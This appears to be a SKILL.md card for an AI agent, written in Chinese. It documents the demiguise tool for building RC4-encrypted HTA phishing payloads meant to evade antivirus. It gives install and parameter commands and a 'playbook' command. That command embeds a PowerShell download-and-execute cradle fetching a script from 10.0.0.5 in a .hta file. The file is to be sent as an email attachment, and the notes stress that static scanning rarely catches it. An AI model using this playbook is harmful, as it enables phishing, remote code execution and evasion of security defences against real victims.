---
name: demiguise-hta-crypt
description: demiguise: HTA 钓鱼载荷。信号:恶意软件开发,免杀开发,生成加密 HTA,RC4 密钥。
---

# demiguise

- 攻击大类:C45 免杀与载荷投递
- 上游仓库:https://github.com/nccgroup/demiguise
- 上游 License:AGPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/nccgroup/demiguise && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python demiguise.py -k key -c 'cmd /c whoami' -o out.hta` | 生成加密 HTA |
| `-c payload.ps1` | PowerShell 载荷 |
| `-k mykey` | RC4 密钥 |
| `-o out.hta` | 输出 |

## 攻击场景 Playbook

### HTA 钓鱼载荷

```bash
python demiguise.py -k secret -c 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/x.ps1")' -o doc.hta
# 邮件附件 .hta,点击执行加密载荷
```

## 注意事项

NCC 出品,HTA 载荷加密工具,RC4 加密+嵌入 HTML,静态查杀难检出。
